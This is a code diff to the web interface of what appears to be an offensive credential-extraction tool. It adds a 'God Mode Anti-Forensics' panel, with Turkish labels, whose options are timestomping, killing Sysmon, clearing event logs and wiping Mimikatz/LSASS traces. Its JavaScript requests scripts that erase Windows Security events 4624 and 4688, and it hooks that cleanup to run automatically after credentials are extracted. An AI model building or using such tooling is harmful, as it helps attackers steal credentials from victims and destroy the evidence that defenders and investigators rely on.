@@ -49,6 +49,43 @@
         </div>
     </div>
 
+    <!-- God Mode Anti-Forensics -->
+    <div class="bg-gray-800 rounded-xl p-4 mb-8 border border-purple-500/30" style="background: linear-gradient(135deg, rgba(168, 85, 247, 0.1), rgba(239, 68, 68, 0.1));">
+        <div class="flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <span class="text-2xl">💀</span>
+                <div>
+                    <h3 class="text-white font-semibold">God Mode Anti-Forensics</h3>
+                    <p class="text-gray-400 text-sm">Credential theft izlerini otomatik temizle</p>
+                </div>
+            </div>
+            <label class="relative inline-flex items-center cursor-pointer">
+                <input type="checkbox" id="godModeEnabled" class="sr-only peer">
+                <div class="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-purple-600"></div>
+            </label>
+        </div>
+        <div id="godModeOptions" class="hidden mt-4 pt-4 border-t border-purple-500/20">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+                <label class="flex items-center gap-2 text-sm text-gray-300 cursor-pointer">
+                    <input type="checkbox" id="gmTimestomp" checked class="accent-purple-500"> 🕐 Time Stomp
+                </label>
+                <label class="flex items-center gap-2 text-sm text-gray-300 cursor-pointer">
+                    <input type="checkbox" id="gmPhantomClean" checked class="accent-purple-500"> 👻 Phantom Clean
+                </label>
+                <label class="flex items-center gap-2 text-sm text-gray-300 cursor-pointer">
+                    <input type="checkbox" id="gmSysmonKill" class="accent-purple-500"> ☠️ Sysmon Kill
+                </label>
+                <label class="flex items-center gap-2 text-sm text-gray-300 cursor-pointer">
+                    <input type="checkbox" id="gmClearLogs" checked class="accent-purple-500"> 🧹 Clear Event Logs
+                </label>
+            </div>
+            <select id="gmCleanupProfile" class="mt-3 w-full bg-gray-900 border border-purple-500/30 rounded-lg px-3 py-2 text-gray-300 text-sm">
+                <option value="credential_theft">🔑 Credential Theft Profile (Mimikatz, LSASS izleri)</option>
+                <option value="full_cleanup">💀 Full Cleanup (NUKE EVERYTHING)</option>
+            </select>
+        </div>
+    </div>
+
     <!-- Action Buttons -->
     <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
         <button onclick="extractPasswords()" class="px-6 py-4 bg-gradient-to-r from-purple-600 to-pink-600 text-white font-semibold rounded-xl hover:opacity-90 transition-opacity">
@@ -403,6 +440,52 @@
         div.textContent = text;
         return div.innerHTML;
     }
+
+    // God Mode Anti-Forensics Integration
+    document.getElementById('godModeEnabled')?.addEventListener('change', function() {
+        const options = document.getElementById('godModeOptions');
+        options.classList.toggle('hidden', !this.checked);
+        console.log(this.checked ? '💀 God Mode ENABLED' : '💀 God Mode disabled');
+    });
+
+    async function executeGodModeCleanup() {
+        if (!document.getElementById('godModeEnabled')?.checked) return;
+        
+        const profile = document.getElementById('gmCleanupProfile')?.value || 'credential_theft';
+        console.log('💀 Executing God Mode Anti-Forensics...');
+        
+        try {
+            const response = await fetch('/god-mode/api/phantom/profile/' + profile);
+            const data = await response.json();
+            console.log('👻 Cleanup profile loaded:', data.name);
+            
+            // Generate cleanup script
+            if (document.getElementById('gmPhantomClean')?.checked) {
+                const cleanResponse = await fetch('/god-mode/api/phantom/generate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        target_events: data.events?.Security || [4624, 4688],
+                        log_type: 'Security',
+                        time_range_hours: 24
+                    })
+                });
+                const cleanData = await cleanResponse.json();
+                console.log('👻 Phantom Cleaner ready');
+            }
+            
+            console.log('💀 Anti-forensics complete');
+        } catch (e) {
+            console.error('God Mode error:', e);
+        }
+    }
+
+    // Wrap extract functions to call God Mode after
+    const originalExtractAll = extractAll;
+    extractAll = async function() {
+        await originalExtractAll();
+        await executeGodModeCleanup();
+    };
 
     // Initialize
     showTab('passwords');
